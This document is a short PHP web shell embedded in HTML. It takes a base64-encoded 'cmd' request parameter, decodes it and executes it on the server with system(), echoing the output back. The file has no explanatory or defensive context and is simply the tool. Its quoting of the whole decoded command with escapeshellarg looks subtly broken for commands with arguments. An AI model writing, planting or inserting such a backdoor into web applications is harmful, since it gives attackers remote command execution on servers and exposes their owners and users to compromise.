<html>
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = escapeshellarg(base64_decode($_REQUEST['cmd']));
        system($cmd);
        echo "</pre>";
        die;
}

?>
</html>

